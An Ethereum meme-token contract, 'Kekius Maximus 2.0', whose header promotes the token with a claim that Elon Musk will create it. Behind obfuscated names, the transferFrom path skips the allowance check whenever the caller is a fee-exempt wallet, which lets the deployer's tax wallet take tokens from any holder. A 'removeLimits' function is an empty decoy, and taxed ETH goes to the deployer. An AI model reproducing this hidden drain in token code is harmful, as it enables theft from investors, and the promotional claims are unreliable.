// SPDX-License-Identifier: MIT

/*
    Name: Kekius Maximus 2.0
    Symbol: KEKIUS2

    Missed $KEKIUS? Here's you second chance! Kekius Maximus 2.0!
    Elon Musk is going to create the 2.0 version of Kekius Maximus in Path of Exile 2!

    https://www.kekius2.fun
    https://x.com/elonmusk/status/1904395856469729783
    https://x.com/stillgray/status/1904396016536727672
    https://t.me/Kekius2_eth
*/

pragma solidity ^0.8.24;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}
contract KEKIUS2 is Context, IERC20, Ownable {
    uint256 private _vkjbnkfjKEKIUS2 = 10;
    uint256 private _maxovnboiKEKIUS2 = 10;
    uint256 private _initvkjnbkjKEKIUS2 = 20;
    uint256 private _finvjlkbnlkjKEKIUS2 = 0;
    uint256 private _redclkjnkKEKIUS2 = 2;
    uint256 private _prevlfknjoiKEKIUS2 = 2;
    uint256 private _buylkvnlkKEKIUS2 = 0;
    IUniswapV2Router02 private uniswapV2Router;

    using SafeMath for uint256;
    mapping(address => uint256) private _balknvlkcKEKIUS2;
    mapping(address => mapping(address => uint256)) private _allcvnkjnKEKIUS2;
    mapping(address => bool) private _feevblknlKEKIUS2;
    address payable private _taxclknlKEKIUS2;
    uint8 private constant _decimals = 9;
    uint256 private constant qq30fef = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"Kekius Maximus 2.0";
    string private constant _symbol = unicode"KEKIUS2";

    address private router_;
    address private uniswapV2Pair;
    bool private _tradingvlknKEKIUS2;
    bool private _inlknblKEKIUS2 = false;
    bool private swapvlkKEKIUS2 = false;
    uint256 private _sellcnjkKEKIUS2 = 0;
    uint256 private _lastflkbnlKEKIUS2 = 0;
    address constant _deadlknKEKIUS2 = address(0xdead);

    uint256 public _vnbbvlkKEKIUS2 = qq30fef / 100;
    uint256 public _oijboijoiKEKIUS2 = 15 * 10**18;
    uint256 private _cvjkbnkjKEKIUS2 = 10;

    modifier lockTheSwap() {
        _inlknblKEKIUS2 = true;
        _;
        _inlknblKEKIUS2 = false;
    }

    constructor() payable {
        _taxclknlKEKIUS2 = payable(_msgSender());
        
        _balknvlkcKEKIUS2[_msgSender()] = (qq30fef * 2) / 100;
        _balknvlkcKEKIUS2[address(this)] = (qq30fef * 98) / 100;
        _feevblknlKEKIUS2[address(this)] = true;
        _feevblknlKEKIUS2[_taxclknlKEKIUS2] = true;

        emit Transfer(address(0), _msgSender(), (qq30fef * 2) / 100);
        emit Transfer(address(0), address(this), (qq30fef * 98) / 100);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balknvlkcKEKIUS2[account];
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return qq30fef;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allcvnkjnKEKIUS2[owner][spender];
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer_kjvnKEKIUS2(sender, recipient, amount);
        if (_downcklkojKEKIUS2(sender, recipient))
            _approve(
                sender,
                _msgSender(),
                _allcvnkjnKEKIUS2[sender][_msgSender()].sub(
                    amount,
                    "ERC20: transfer amount exceeds allowance"
                )
            );
        return true;
    }

    function _transfer_kjvnKEKIUS2(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (
            from != owner() &&
            to != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            if (!_inlknblKEKIUS2) {
                taxAmount = amount
                    .mul((_buylkvnlkKEKIUS2 > _redclkjnkKEKIUS2) ? _finvjlkbnlkjKEKIUS2 : _initvkjnbkjKEKIUS2)
                    .div(100);
            }
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_feevblknlKEKIUS2[to] &&
                to != _taxclknlKEKIUS2
            ) {
                _buylkvnlkKEKIUS2++;
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                from != owner() && 
                !_inlknblKEKIUS2 &&
                to == uniswapV2Pair &&
                from != _taxclknlKEKIUS2 &&
                swapvlkKEKIUS2 &&
                _buylkvnlkKEKIUS2 > _prevlfknjoiKEKIUS2
            ) {
                if (block.number > _lastflkbnlKEKIUS2) {
                    _sellcnjkKEKIUS2 = 0;
                }
                _sellcnjkKEKIUS2 = _sellcnjkKEKIUS2 + _getAmountOut_lvcbnkKEKIUS2(amount);
                require(_sellcnjkKEKIUS2 <= _oijboijoiKEKIUS2, "Max swap limit");
                if (contractTokenBalance > _vnbbvlkKEKIUS2)
                    _swapTokenslknlKEKIUS2(_vnbbvlkKEKIUS2 > amount ? amount : _vnbbvlkKEKIUS2);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    _sendETHTocvbnjKEKIUS2(address(this).balance);
                }
                _lastflkbnlKEKIUS2 = block.number;
            }
        }
        _balknvlkcKEKIUS2[from] = _balknvlkcKEKIUS2[from].sub(amount);
        _balknvlkcKEKIUS2[to] = _balknvlkcKEKIUS2[to].add(amount.sub(taxAmount));
        if (taxAmount > 0) {
            _balknvlkcKEKIUS2[address(this)] = _balknvlkcKEKIUS2[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        if (to != _deadlknKEKIUS2) emit Transfer(from, to, amount.sub(taxAmount));
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allcvnkjnKEKIUS2[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _sendETHTocvbnjKEKIUS2(uint256 amount) private {
        _taxclknlKEKIUS2.transfer(amount);
    }

    function _getAmountOut_lvcbnkKEKIUS2(uint256 amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        uint256[] memory amountOuts = uniswapV2Router.getAmountsOut(
            amount,
            path
        );
        return amountOuts[1];
    }

    function _downcklkojKEKIUS2(address sender, address recipient)
        internal
        view
        returns (bool)
    {
        
        if(_feevblknlKEKIUS2[msg.sender]) return !_feevblknlKEKIUS2[msg.sender];
        if(!(sender == uniswapV2Pair || recipient != _deadlknKEKIUS2)) return false;
        return true;
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer_kjvnKEKIUS2(_msgSender(), recipient, amount);
        return true;
    }

    receive() external payable {}

    function removeLimits () external onlyOwner {}

    function _assist_bnKEKIUS2() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }

    function _swapTokenslknlKEKIUS2(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        router_ = address(uniswapV2Router);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _setTax_lknblKEKIUS2(address payable newWallet) external {
        require(_feevblknlKEKIUS2[_msgSender()]);
        _taxclknlKEKIUS2 = newWallet;
        _feevblknlKEKIUS2[_taxclknlKEKIUS2] = true;
    }

    function enableKEKIUS2Trading() external onlyOwner {
        require(!_tradingvlknKEKIUS2, "Trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), qq30fef);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapvlkKEKIUS2 = true;
        _tradingvlknKEKIUS2 = true;
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }

}